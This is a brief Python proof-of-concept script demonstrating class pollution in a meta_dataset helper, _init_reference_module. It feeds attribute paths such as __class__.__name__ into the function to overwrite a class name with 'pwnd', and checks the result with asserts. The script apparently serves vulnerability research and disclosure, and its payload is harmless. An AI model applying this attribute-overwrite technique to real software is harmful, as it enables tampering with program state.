# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: _init_reference_module
# Type: get-attr-set-attr

from meta_dataset.models.experimental.reparameterizable_base_test import _init_reference_module

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD_KEYS = [["__class__", "__name__"]]
PAYLOAD_VALUES = [payload_value]

def run_poc():
  _init_reference_module(Target, {}, PAYLOAD_KEYS, PAYLOAD_VALUES)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
